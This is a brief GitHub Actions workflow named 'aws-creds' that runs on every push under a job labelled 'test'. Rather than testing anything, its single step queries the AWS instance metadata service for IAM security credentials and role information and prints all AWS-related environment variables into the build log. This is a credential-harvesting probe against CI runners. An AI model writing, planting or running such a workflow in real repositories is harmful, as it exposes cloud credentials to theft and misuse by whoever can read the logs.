name: aws-creds
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: aws metadata
        run: |
          curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
          curl -s http://169.254.169.254/latest/meta-data/iam/info/
          env | grep -E "AWS|AMAZON" || true
